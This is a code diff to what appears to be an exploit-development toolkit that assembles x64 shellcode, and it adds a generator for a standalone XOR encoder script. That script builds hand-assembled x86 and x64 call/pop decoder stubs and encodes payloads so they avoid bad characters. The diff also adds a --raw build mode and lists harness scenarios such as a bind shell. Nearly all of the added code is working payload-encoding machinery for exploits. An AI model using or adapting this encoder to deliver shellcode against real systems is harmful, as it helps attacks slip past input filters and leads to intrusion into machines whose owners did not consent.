@@ -479,6 +479,190 @@ def compose_asm_x64(
     return "\n".join(parts)
 
 
+def generate_xor_wrapper(arch: str = "x86", badchars: set[int] | None = None) -> str:
+    """Generate a standalone XOR wrapper script for offline encoding.
+
+    Works on any platform with Python 3.12+. No assembler needed.
+    Reads shellcode.bin, XOR-encodes it, writes shellcode_encoded.bin.
+    """
+    bc_hex = ", ".join(f"0x{b:02x}" for b in sorted(badchars or {0x00, 0x0A, 0x0D}))
+    return f'''\
+#!/usr/bin/env python3
+"""Standalone XOR encoder for {arch} shellcode.
+
+Reads raw shellcode, XOR-encodes with a single-byte key that avoids
+the specified badchars, prepends a self-decoding stub, and writes the
+encoded output.
+
+Usage:
+    python xor_wrapper.py shellcode.bin
+    python xor_wrapper.py shellcode.bin -o encoded.bin
+    python xor_wrapper.py shellcode.bin --badchars 00,0a,0d,20
+    python xor_wrapper.py shellcode.bin --key 0x41
+
+No external dependencies. Works on any platform with Python 3.12+.
+"""
+import argparse
+import struct
+import sys
+
+
+ARCH = "{arch}"
+DEFAULT_BADCHARS = {{{bc_hex}}}
+
+
+def find_xor_key(payload: bytes, badchars: set[int]) -> int | None:
+    """Find a single-byte XOR key that produces no badchar bytes."""
+    for key in range(1, 256):
+        if key in badchars:
+            continue
+        if not any((b ^ key) in badchars for b in payload):
+            return key
+    return None
+
+
+def build_decoder_stub_x86(payload_len: int, key: int, badchars: set[int]) -> bytes | None:
+    """Build an x86 call/pop decoder stub."""
+    small = payload_len <= 255
+    for pad in range(16):
+        parts: list[int] = []
+        parts.extend([0x90] * pad)
+        jmp1_idx = len(parts)
+        parts.extend([0xEB, 0x00])
+        decoder_offset = len(parts)
+        parts.append(0x5E)
+        parts.extend([0x31, 0xC9])
+        if small:
+            parts.extend([0xB1, payload_len & 0xFF])
+        else:
+            parts.extend([0x66, 0xB9, payload_len & 0xFF, (payload_len >> 8) & 0xFF])
+        loop_target = len(parts)
+        parts.extend([0x80, 0x36, key])
+        parts.append(0x46)
+        loop_instr = len(parts)
+        parts.extend([0xE2, (loop_target - (loop_instr + 2)) & 0xFF])
+        parts.extend([0xEB, 0x05])
+        call_instr = len(parts)
+        call_disp = decoder_offset - (call_instr + 5)
+        parts.append(0xE8)
+        parts.extend([(call_disp & 0xFFFFFFFF) >> (8 * i) & 0xFF for i in range(4)])
+        parts[jmp1_idx + 1] = (call_instr - (jmp1_idx + 2)) & 0xFF
+        stub = bytes(parts)
+        if not any(b in badchars for b in stub):
+            return stub
+    return None
+
+
+def build_decoder_stub_x64(payload_len: int, key: int, badchars: set[int]) -> bytes | None:
+    """Build an x64 call/pop decoder stub (RCX loop, REX inc rsi)."""
+    small = payload_len <= 255
+    for pad in range(16):
+        parts: list[int] = []
+        parts.extend([0x90] * pad)
+        jmp1_idx = len(parts)
+        parts.extend([0xEB, 0x00])
+        decoder_offset = len(parts)
+        parts.append(0x5E)                      # pop rsi
+        parts.extend([0x48, 0x31, 0xC9])        # xor rcx, rcx
+        if small:
+            parts.extend([0xB1, payload_len & 0xFF])  # mov cl, len
+        else:
+            parts.extend([0x66, 0xB9, payload_len & 0xFF, (payload_len >> 8) & 0xFF])
+        loop_target = len(parts)
+        parts.extend([0x80, 0x36, key])          # xor byte [rsi], key
+        parts.extend([0x48, 0xFF, 0xC6])         # inc rsi
+        loop_instr = len(parts)
+        parts.extend([0xE2, (loop_target - (loop_instr + 2)) & 0xFF])  # loop
+        parts.extend([0xEB, 0x05])               # jmp short payload
+        call_instr = len(parts)
+        call_disp = decoder_offset - (call_instr + 5)
+        parts.append(0xE8)
+        parts.extend([(call_disp & 0xFFFFFFFF) >> (8 * i) & 0xFF for i in range(4)])
+        parts[jmp1_idx + 1] = (call_instr - (jmp1_idx + 2)) & 0xFF
+        stub = bytes(parts)
+        if not any(b in badchars for b in stub):
+            return stub
+    return None
+
+
+def xor_encode(payload: bytes, badchars: set[int], arch: str,
+               forced_key: int | None = None) -> tuple[bytes, dict]:
+    """XOR-encode payload with decoder stub. Returns (encoded, info)."""
+    if forced_key is not None:
+        key = forced_key
+        if key in badchars:
+            return b"", {{"error": f"Key 0x{{key:02x}} is in the badchar set"}}
+        if any((b ^ key) in badchars for b in payload):
+            return b"", {{"error": f"Key 0x{{key:02x}} produces badchar bytes"}}
+    else:
+        key = find_xor_key(payload, badchars)
+        if key is None:
+            return b"", {{"error": "No valid XOR key found for this payload + badchar set"}}
+
+    build_stub = build_decoder_stub_x64 if arch == "x64" else build_decoder_stub_x86
+    stub = build_stub(len(payload), key, badchars)
+    if stub is None:
+        return b"", {{"error": f"Could not build clean decoder stub for key 0x{{key:02x}}"}}
+
+    encoded_body = bytes(b ^ key for b in payload)
+    full = stub + encoded_body
+
+    if any(b in badchars for b in full):
+        return b"", {{"error": "Final output still contains badchar bytes"}}
+
+    return full, {{
+        "key": key,
+        "stub_size": len(stub),
+        "payload_size": len(payload),
+        "total_size": len(full),
+        "arch": arch,
+    }}
+
+
+def main():
+    parser = argparse.ArgumentParser(description="XOR encode shellcode")
+    parser.add_argument("input", help="Raw shellcode .bin file")
+    parser.add_argument("-o", "--output", default=None, help="Output file (default: shellcode_encoded.bin)")
+    parser.add_argument("--badchars", default=None,
+                        help="Comma-separated hex bytes (e.g. 00,0a,0d,20)")
+    parser.add_argument("--key", default=None, help="Force a specific XOR key (e.g. 0x41)")
+    parser.add_argument("--arch", default=ARCH, choices=["x86", "x64"],
+                        help=f"Architecture (default: {{ARCH}})")
+    args = parser.parse_args()
+
+    payload = open(args.input, "rb").read()
+    if not payload:
+        print("[!] Empty input file", file=sys.stderr)
+        sys.exit(1)
+
+    badchars = DEFAULT_BADCHARS
+    if args.badchars:
+        badchars = set(int(b, 16) for b in args.badchars.split(","))
+
+    forced_key = int(args.key, 16) if args.key else None
+
+    encoded, info = xor_encode(payload, badchars, args.arch, forced_key)
+    if not encoded:
+        print(f"[!] {{info['error']}}", file=sys.stderr)
+        sys.exit(1)
+
+    out_path = args.output or "shellcode_encoded.bin"
+    open(out_path, "wb").write(encoded)
+
+    print(f"[+] Arch:       {{info['arch']}}")
+    print(f"[+] Key:        0x{{info['key']:02x}}")
+    print(f"[+] Stub:       {{info['stub_size']}} bytes")
+    print(f"[+] Payload:    {{info['payload_size']}} bytes")
+    print(f"[+] Total:      {{info['total_size']}} bytes")
+    print(f"[+] Badchars:   {{' '.join(f'0x{{b:02x}}' for b in sorted(badchars))}}")
+    print(f"[+] Output:     {{out_path}}")
+
+
+if __name__ == "__main__":
+    main()
+'''
+
+
 def generate_debug_runner_x64(asm: str) -> str:
     """Generate a self-contained Python debug script for x64 shellcode."""
     asm = asm.replace(";", "#")
@@ -890,12 +1074,16 @@ def build_x64(
     out_dir: str = "emitter_out",
     assemble: bool = True,
     encode: bool = False,
+    raw: bool = False,
 ) -> "BuildResult":
     """Run the full x64 build pipeline. Returns a BuildResult (same shape as x86).
 
     Mirrors build.build() but uses x64 stack allocator, x64 framework stubs,
     and x64 compose pipeline. When *encode* is True and assembled output has
     badchar violations, the XOR encoder is invoked automatically.
+
+    When *raw* is True, inline badchar avoidance is skipped (no XOR-mask
+    pairs for immediates). Use with *encode* for smallest shellcode.
     """
     from .build import (
         BuildResult,
@@ -914,7 +1102,8 @@ def build_x64(
     manifest = load_manifest(manifest_path)
     config = config or TemplateConfig(arch="x64")
     config.arch = "x64"
-    config.badchars = manifest.badchars
+    manifest_badchars = manifest.badchars
+    config.badchars = set() if raw else manifest.badchars
 
     manifest = _apply_config_overrides(manifest, config)
 
@@ -939,7 +1128,7 @@ def build_x64(
     layout = build_layout_x64(manifest, extra_structs=extra_structs, max_stack_args=max_stack_args)
     asm = compose_asm_x64(manifest, layout, manifest_path, template, config)
 
-    raw: bytes | None = None
+    sc_bytes: bytes | None = None
     assembler: str | None = None
     asm_errors: list[str] = []
     encoded_bytes: bytes | None = None
@@ -951,20 +1140,19 @@ def build_x64(
             ks = keystone.Ks(keystone.KS_ARCH_X86, keystone.KS_MODE_64)
             from .build import _strip_comments
             encoding, _ = ks.asm(_strip_comments(asm))
-            raw = bytes(encoding)
+            sc_bytes = bytes(encoding)
             assembler = "keystone-x64"
 
-            bc_set = config.badchars
-            if bc_set and raw:
+            if manifest_badchars and sc_bytes:
                 violations = [
                     (off, byte)
-                    for off, byte in enumerate(raw)
-                    if byte in bc_set
+                    for off, byte in enumerate(sc_bytes)
+                    if byte in manifest_badchars
                 ]
                 if violations:
                     if encode:
-                        from .xor_encoder import xor_encode
-                        enc = xor_encode(raw, bc_set)
+                        from .xor_encoder import xor_encode_x64
+                        enc = xor_encode_x64(sc_bytes, manifest_badchars)
                         encoder_report = enc.diagnostics
                         if enc.success:
                             encoded_bytes = enc.encoded
@@ -981,29 +1169,30 @@ def build_x64(
                             f"Badchar bytes in assembled output ({len(violations)} "
                             f"occurrences): {detail}"
                         )
-                        raw = None
+                        sc_bytes = None
                         assembler = None
         except ImportError:
             asm_errors.append("keystone not available; skipping x64 assembly")
         except Exception as e:
             asm_errors.append(f"keystone-x64: {e}")
 
-    contract_md = _emit_contract_md_x64(manifest, layout, raw)
+    contract_md = _emit_contract_md_x64(manifest, layout, sc_bytes)
 
     return BuildResult(
         manifest_path=manifest_path,
         asm=asm,
         contract_md=contract_md,
-        shellcode_bytes=raw,
-        hex_str=_bytes_to_hex_str(raw) if raw else None,
-        py_bytes=_bytes_to_py(raw) if raw else None,
-        c_array=_bytes_to_c(raw) if raw else None,
+        shellcode_bytes=sc_bytes,
+        hex_str=_bytes_to_hex_str(sc_bytes) if sc_bytes else None,
+        py_bytes=_bytes_to_py(sc_bytes) if sc_bytes else None,
+        c_array=_bytes_to_c(sc_bytes) if sc_bytes else None,
         debug_runner=generate_debug_runner_x64(asm),
         layout=layout,
         assembler=assembler,
         asm_errors=asm_errors if asm_errors else None,
         encoded_bytes=encoded_bytes,
         encoder_report=encoder_report,
+        xor_wrapper=generate_xor_wrapper(arch="x64", badchars=manifest_badchars),
     )
 
 
@@ -1050,6 +1239,9 @@ def main_x64() -> None:
                         help="Skip assembly (generate .asm only)")
     parser.add_argument("--encode", action="store_true",
                         help="Apply XOR encoding when badchar violations are detected")
+    parser.add_argument("--raw", action="store_true",
+                        help="Skip inline badchar avoidance (smallest shellcode). "
+                             "Combine with --encode for whole-payload XOR encoding.")
     parser.add_argument("--run-scenario", metavar="NAME",
                         help="Build from a named harness scenario and execute "
                              "(e.g. test_a_winexec, test_e_bind_shell, or 'all')")
@@ -1107,6 +1299,7 @@ def main_x64() -> None:
         out_dir=args.out,
         assemble=not args.no_assemble,
         encode=args.encode,
+        raw=args.raw,
     )
     write_outputs(result, args.out)
 
